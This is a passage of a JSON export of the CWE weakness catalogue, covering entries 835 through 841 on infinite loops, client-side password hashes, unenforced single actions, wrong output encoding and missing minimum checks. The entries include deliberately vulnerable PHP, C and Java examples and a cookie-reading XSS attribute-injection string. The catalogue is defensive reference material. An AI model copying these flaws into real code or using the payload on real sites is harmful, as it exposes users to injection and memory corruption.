          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-22224",
          "Description": "Chain: an operating system does not properly process malformed Open Shortest Path First (OSPF) Type/Length/Value Identifiers (TLV) (CWE-703), which can cause the process to enter an infinite loop (CWE-835)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-22224"
        },
        {
          "Reference": "CVE-2022-25304",
          "Description": "A Python machine communication platform did not account for receiving a malformed packet with a null size, causing the receiving function to never update the message buffer and be caught in an infinite loop.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-25304"
        },
        {
          "Reference": "CVE-2011-1027",
          "Description": "Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1027"
        },
        {
          "Reference": "CVE-2011-1142",
          "Description": "Chain: self-referential values in recursive definitions lead to infinite loop.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1142"
        },
        {
          "Reference": "CVE-2011-1002",
          "Description": "NULL UDP packet is never cleared from a queue, leading to infinite loop.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1002"
        },
        {
          "Reference": "CVE-2006-6499",
          "Description": "Chain: web browser crashes due to infinite loop - \"bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6499"
        },
        {
          "Reference": "CVE-2010-4476",
          "Description": "Floating point conversion routine cycles back and forth between two different values.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4476"
        },
        {
          "Reference": "CVE-2010-4645",
          "Description": "Floating point conversion routine cycles back and forth between two different values.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4645"
        },
        {
          "Reference": "CVE-2010-2534",
          "Description": "Chain: improperly clearing a pointer in a linked list leads to infinite loop.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2534"
        },
        {
          "Reference": "CVE-2013-1591",
          "Description": "Chain: an integer overflow (CWE-190) in the image size calculation causes an infinite loop (CWE-835) which sequentially allocates buffers without limits (CWE-1325) until the stack is full.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1591"
        },
        {
          "Reference": "CVE-2008-3688",
          "Description": "Chain: A denial of service may be caused by an uninitialized variable (CWE-457) allowing an infinite loop (CWE-835) resulting from a connection to an unresponsive server.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3688"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-835"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Looping Constructs\", Page 327",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-835",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "836",
      "Name": "Use of Password Hash Instead of Password for Authentication",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.",
      "ExtendedDescription": "\n\nSome authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.\n\n\nAs a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "602",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker could bypass the authentication routine without knowing the original password."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-1283",
          "Description": "Product performs authentication with user-supplied password hashes that can be obtained from a separate SQL injection vulnerability (CVE-2009-1282).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1283"
        },
        {
          "Reference": "CVE-2005-3435",
          "Description": "Product allows attackers to bypass authentication by obtaining the password hash for another user and specifying the hash in the pwd argument.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3435"
        }
      ],
      "RelatedAttackPatterns": [
        "644",
        "652"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "837",
      "Name": "Improper Enforcement of a Single, Unique Action",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product requires that an actor should only be able to perform an action once, or to have only one unique action, but the product does not enforce or improperly enforces this restriction.",
      "ExtendedDescription": "In various applications, a user is only expected to perform a certain action once, such as voting, requesting a refund, or making a purchase. When this restriction is not enforced, sometimes this can have security implications. For example, in a voting application, an attacker could attempt to \"stuff the ballot box\" by voting multiple times. If these votes are counted separately, then the attacker could directly affect who wins the vote. This could have significant business impact depending on the purpose of the product.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "799",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "An attacker might be able to gain advantage over other users by performing the action multiple times, or affect the correctness of the product."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-0294",
          "Description": "Ticket-booking web application allows a user to lock a seat more than once.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0294"
        },
        {
          "Reference": "CVE-2005-4051",
          "Description": "CMS allows people to rate downloads by voting more than once.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4051"
        },
        {
          "Reference": "CVE-2002-216",
          "Description": "Polling software allows people to vote more than once by setting a cookie.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-216"
        },
        {
          "Reference": "CVE-2003-1433",
          "Description": "Chain: lack of validation of a challenge key in a game allows a player to register multiple times and lock other players out of the game.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1433"
        },
        {
          "Reference": "CVE-2002-1018",
          "Description": "Library feature allows attackers to check out the same e-book multiple times, preventing other users from accessing copies of the e-book.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1018"
        },
        {
          "Reference": "CVE-2009-2346",
          "Description": "Protocol implementation allows remote attackers to cause a denial of service (call-number exhaustion) by initiating many message exchanges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2346"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "838",
      "Name": "Inappropriate Encoding for Output Context",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.",
      "ExtendedDescription": "\n\nThis weakness can cause the downstream component to use a decoding method that produces different data than what the product intended to send. When the wrong encoding is used - even if closely related - the downstream component could decode the data incorrectly. This can have security consequences when the provided boundaries between control and data are inadvertently broken, because the resulting data could introduce control characters or special elements that were not sent by the product. The resulting data could then be used to bypass protection mechanisms such as input validation, and enable injection attacks.\n\n\nWhile using output encoding is essential for ensuring that communications between components are accurate, the use of the wrong encoding - even if closely related - could cause the downstream component to misinterpret the output.\n\n\nFor example, HTML entity encoding is used for elements in the HTML body of a web page. However, a programmer might use entity encoding when generating output for that is used within an attribute of an HTML tag, which could contain functional Javascript that is not affected by the HTML encoding.\n\n\nWhile web applications have received the most attention for this problem, this weakness could potentially apply to any type of product that uses a communications stream that could support multiple encodings.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "116",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "116",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Modify Application Data",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Output Encoding",
          "Description": "Use context-aware encoding. That is, understand which encoding is being used by the downstream component, and ensure that this encoding is used. If an encoding can be specified, do so, instead of assuming that the default encoding is the same as the default being assumed by the downstream component."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Output Encoding",
          "Description": "Where possible, use communications protocols or data formats that provide strict boundaries between control and data. If this is not feasible, ensure that the protocols or formats allow the communicating components to explicitly state which encoding/decoding method is being used. Some template frameworks provide built-in support."
        },
        {
          "MitigationID": "MIT-4.3",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.\n\n\nNote that some template mechanisms provide built-in support for the appropriate encoding.\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This code dynamically builds an HTML page using POST data:"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$username = $_POST['username'];\n\t$picSource = $_POST['picsource'];\n\t$picAltText = $_POST['picalttext'];\n```\n...* \n\t\n\techo \"<title>Welcome, \" . htmlentities($username) .\"</title>\";\n\techo \"<img src='\". htmlentities($picSource) .\" ' alt='\". htmlentities($picAltText) . '\" />';\n\t\n\t *...*"
            },
            {
              "BodyText": "The programmer attempts to avoid XSS exploits (CWE-79) by encoding the POST values so they will not be interpreted as valid HTML. However, the htmlentities() encoding is not appropriate when the data are used as HTML attributes, allowing more attributes to be injected."
            },
            {
              "BodyText": "For example, an attacker can set picAltText to:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t\"altTextHere' onload='alert(document.cookie)\"\n```"
            },
            {
              "BodyText": "This will result in the generated HTML image tag:"
            },
            {
              "Nature": "Result",
              "Language": "HTML",
              "ExampleCode": "```\n\t<img src='pic.jpg' alt='altTextHere' onload='alert(document.cookie)' />\n```"
            },
            {
              "BodyText": "The attacker can inject arbitrary javascript into the tag due to this incorrect encoding."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-2814",
          "Description": "Server does not properly handle requests that do not contain UTF-8 data; browser assumes UTF-8, allowing XSS.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2814"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "IDS13-J",
          "EntryName": "Use compatible encodings on both sides of file or network IO"
        }
      ],
      "RelatedAttackPatterns": [
        "468"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-786",
          "Authors": [
            "Jim Manico"
          ],
          "Title": "Injection-safe templating languages",
          "PublicationYear": "2010",
          "PublicationMonth": "06",
          "PublicationDay": "30",
          "URL": "https://manicode.blogspot.com/2010/06/injection-safe-templating-languages_30.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-787",
          "Authors": [
            "Dinis Cruz"
          ],
          "Title": "Can we please stop saying that XSS is boring and easy to fix!",
          "PublicationYear": "2010",
          "PublicationMonth": "09",
          "PublicationDay": "25",
          "URL": "http://diniscruz.blogspot.com/2010/09/can-we-please-stop-saying-that-xss-is.html"
        },
        {
          "ExternalReferenceID": "REF-788",
          "Authors": [
            "Ivan Ristic"
          ],
          "Title": "Canoe: XSS prevention via context-aware output encoding",
          "PublicationYear": "2010",
          "PublicationMonth": "09",
          "PublicationDay": "24",
          "URL": "https://blog.ivanristic.com/2010/09/introducing-canoe-context-aware-output-encoding-for-xss-prevention.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-789",
          "Authors": [
            "Jim Manico"
          ],
          "Title": "What is the Future of Automated XSS Defense Tools?",
          "PublicationYear": "2011",
          "PublicationMonth": "03",
          "PublicationDay": "08",
          "URL": "http://software-security.sans.org/downloads/appsec-2011-files/manico-appsec-future-tools.pdf"
        },
        {
          "ExternalReferenceID": "REF-709",
          "Section": "Preventing XSS Attacks",
          "Authors": [
            "Jeremiah Grossman",
            "Robert \"RSnake\" Hansen",
            "Petko \"pdp\" D. Petkov",
            "Anton Rager",
            "Seth Fogie"
          ],
          "Title": "XSS Attacks",
          "PublicationYear": "2007",
          "Publisher": "Syngress"
        },
        {
          "ExternalReferenceID": "REF-725",
          "Authors": [
            "OWASP"
          ],
          "Title": "DOM based XSS Prevention Cheat Sheet",
          "URL": "http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet"
        },
        {
          "ExternalReferenceID": "REF-45",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP Enterprise Security API (ESAPI) Project",
          "URL": "http://www.owasp.org/index.php/ESAPI"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "839",
      "Name": "Numeric Range Comparison Without Minimum Check",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product checks a value to ensure that it is less than or equal to a maximum, but it does not also verify that the value is greater than or equal to the minimum.",
      "ExtendedDescription": "\n\nSome products use signed integers or floats even when their values are only expected to be positive or 0. An input validation check might assume that the value is positive, and only check for the maximum value. If the value is negative, but the code assumes that the value is positive, this can produce an error. The error may have security consequences if the negative value is used for memory allocation, array access, buffer access, etc. Ultimately, the error could lead to a buffer overflow or other type of memory corruption.\n\n\nThe use of a negative number in a positive-only context could have security implications for other types of resources. For example, a shopping cart might check that the user is not requesting more than 10 items, but a request for -3 items could cause the application to calculate a negative price and credit the attacker's account.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1023",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "195",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "682",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "119",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "124",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Signed comparison",
          "Description": "The \"signed comparison\" term is often used to describe when the product uses a signed variable and checks it to ensure that it is less than a maximum value (typically a maximum buffer size), but does not verify that it is greater than 0."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Modify Application Data",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "in some contexts, a negative value could lead to resource consumption."
        },
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Modify Memory",
            "Read Memory"
          ],
          "Note": "If a negative value is used to access memory, buffers, or other indexable structures, it could access memory outside the bounds of the buffer."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Enforcement by Conversion",
          "Description": "If the number to be used is always expected to be positive, change the variable type from signed to unsigned or size_t."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "If the number to be used could have a negative value based on the specification (thus requiring a signed value), but the number should only be positive to preserve code correctness, then include a check to ensure that the value is positive."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-21",
          "Entries": [
            {
              "IntroText": "The following code is intended to read an incoming packet from a socket and extract one or more headers."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tDataPacket *packet;\n\tint numHeaders;\n\tPacketHeader *headers;\n\tsock=AcceptSocketConnection();\n\tReadPacket(packet, sock);\n\tnumHeaders =packet->headers;\n\tif (numHeaders > 100) {\n\t\tExitError(\"too many headers!\");\n\t}\n\theaders = malloc(numHeaders * sizeof(PacketHeader);\n\tParsePacketHeaders(packet, headers);\n```"
            },
            {
              "BodyText": "The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory (CWE-195). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow."
            }
          ]
        },
        {
          "ID": "DX-23",
          "Entries": [
            {
              "IntroText": "The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of \"short s\" is forced in this particular example, short int's are frequently used within real-world code, such as code that processes structured data."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint GetUntrustedInt () {\n\t\treturn(0x0000FFFF);\n\t}\n\tvoid main (int argc, char **argv) {\n\t\t\tchar path[256];\n\t\t\tchar *input;\n\t\t\tint i;\n\t\t\tshort s;\n\t\t\tunsigned int sz;\n\t\t\ti = GetUntrustedInt();\n\t\t\ts = i;\n\t\t\t/* s is -1 so it passes the safety check - CWE-697 */\n\t\t\tif (s > 256) {\n\t\t\t\tDiePainfully(\"go away!\\n\");\n\t\t\t}\n\t\t\t/* s is sign-extended and saved in sz */\n\t\t\tsz = s;\n\t\t\t/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */\n\t\t\tprintf(\"i=%d, s=%d, sz=%u\\n\", i, s, sz);\n\t\t\tinput = GetUserInput(\"Enter pathname:\");\n\t\t\t/* strncpy interprets s as unsigned int, so it's treated as MAX_INT\n\t\t\t(CWE-195), enabling buffer overflow (CWE-119) */\n\t\t\tstrncpy(path, input, s);\n\t\t\tpath[255] = '\\0'; /* don't want CWE-170 */\n\t\t\tprintf(\"Path is: %s\\n\", path);\n\t}\n```"
            },
            {
              "BodyText": "This code first exhibits an example of CWE-839, allowing \"s\" to be a negative number. When the negative short \"s\" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow (CWE-119)."
            }
          ]
        },
        {
          "ID": "DX-100",
          "Entries": [
            {
              "IntroText": "In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint getValueFromArray(int *array, int len, int index) {\n\t\t\tint value;\n```\n// check that the array index is less than the maximum* \n\t\t\t\n\t\t\t\n\t\t\t *// length of the array* \n\t\t\tif (index < len) {\n\t\t\t```\n```\n// get the value at the specified index of the array* \n\t\t\t\t\tvalue = array[index];}\n\t\t\t\n\t\t\t *// if array index is invalid then output error message* \n\t\t\t\n\t\t\t\n\t\t\t *// and return value indicating error* \n\t\t\telse {\n\t\t\t```\n\t\t\t\tprintf(\"Value is: %d\\n\", array[index]);\n\t\t\t\tvalue = -1;\n\t\t\t}\n\t\t\treturn value;\n\t}\n```"
            },
            {
              "BodyText": "However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n```\n// check that the array index is within the correct* \n\t\n\t\n\t *// range of values for the array* \n\tif (index >= 0 && index < len) {\n\t\n\t..."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code shows a simple BankAccount class with deposit and withdraw methods."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankAccount {\n\t\t\tpublic final int MAXIMUM_WITHDRAWAL_LIMIT = 350;\n```\n// variable for bank account balance* \n\t\t\tprivate double accountBalance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount* \n\t\t\tpublic BankAccount() {\n\t\t\t```\n\t\t\t\taccountBalance = 0;\n\t\t\t}\n```\n// method to deposit amount into BankAccount* \n\t\t\tpublic void deposit(double depositAmount) {...}\n\t\t\t\n\t\t\t\n\t\t\t *// method to withdraw amount from BankAccount* \n\t\t\tpublic void withdraw(double withdrawAmount) {\n\t\t\t```\n\t\t\t\t\tif (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT) {\n\t\t\t\t\t\t\tdouble newBalance = accountBalance - withdrawAmount;\n\t\t\t\t\t\t\taccountBalance = newBalance;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tSystem.err.println(\"Withdrawal amount exceeds the maximum limit allowed, please try again...\");\n\t\t\t\t\t\t...\n\t\t\t\t\t}\n\t\t\t}\n```\n// other methods for accessing the BankAccount object* \n\t\t\t...}"
            },
            {
              "BodyText": "The withdraw method includes a check to ensure that the withdrawal amount does not exceed the maximum limit allowed, however the method does not check to ensure that the withdrawal amount is greater than a minimum value (CWE-129). Performing a range check on a value that does not include a minimum check can have significant security implications, in this case not including a minimum range check can allow a negative value to be used which would cause the financial application using this class to deposit money into the user account rather than withdrawing. In this example the if statement should the modified to include a minimum range check, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankAccount {\n\t\t\tpublic final int MINIMUM_WITHDRAWAL_LIMIT = 0;\n\t\t\tpublic final int MAXIMUM_WITHDRAWAL_LIMIT = 350;\n\t\t\t...\n```\n// method to withdraw amount from BankAccount* \n\t\t\tpublic void withdraw(double withdrawAmount) {\n\t\t\t```\n\t\t\t\t\tif (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT &&\n\t\t\t\t\twithdrawAmount > MINIMUM_WITHDRAWAL_LIMIT) {\n\t\t\t\t\t\t\t...\n```"
            },
            {
              "BodyText": "Note that this example does not protect against concurrent access to the BankAccount balance variable, see CWE-413 and CWE-362."
            },
            {
              "BodyText": "While it is out of scope for this example, note that the use of doubles or floats in financial calculations may be subject to certain kinds of attacks where attackers use rounding errors to steal money."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-1866",
          "Description": "Chain: integer overflow (CWE-190) causes a negative signed value, which later bypasses a maximum-only check (CWE-839), leading to heap-based buffer overflow (CWE-122).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1866"
        },
        {
          "Reference": "CVE-2009-1099",
          "Description": "Chain: 16-bit counter can be interpreted as a negative value, compared to a 32-bit maximum value, leading to buffer under-write.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1099"
        },
        {
          "Reference": "CVE-2011-0521",
          "Description": "Chain: kernel's lack of a check for a negative value leads to memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0521"
        },
        {
          "Reference": "CVE-2010-3704",
          "Description": "Chain: parser uses atoi() but does not check for a negative value, which can happen on some platforms, leading to buffer under-write.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3704"
        },
        {
          "Reference": "CVE-2010-2530",
          "Description": "Chain: Negative value stored in an int bypasses a size check and causes allocation of large amounts of memory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2530"
        },
        {
          "Reference": "CVE-2009-3080",
          "Description": "Chain: negative offset value to IOCTL bypasses check for maximum index, then used as an array index for buffer under-read.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3080"
        },
        {
          "Reference": "CVE-2008-6393",
          "Description": "chain: file transfer client performs signed comparison, leading to integer overflow and heap-based buffer overflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6393"
        },
        {
          "Reference": "CVE-2008-4558",
          "Description": "chain: negative ID in media player bypasses check for maximum index, then used as an array index for buffer under-read.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4558"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Type Conversion Vulnerabilities\" Page 246",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Comparisons\", Page 265",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "841",
      "Name": "Improper Enforcement of Behavioral Workflow",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.",
      "ExtendedDescription": "\n\nBy performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the product or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.\n\n\nFor example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the product might still perform the transfer.\n\n\nNote that this is different than CWE-696, which focuses on when the product performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.\n\n\nWorkflow-related behaviors include:\n\n\n  - Steps are performed in the expected order.\n\n  - Required steps are not omitted.\n\n  - Steps are not interrupted.\n\n  - Steps are performed in a timely fashion.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic"
          ],
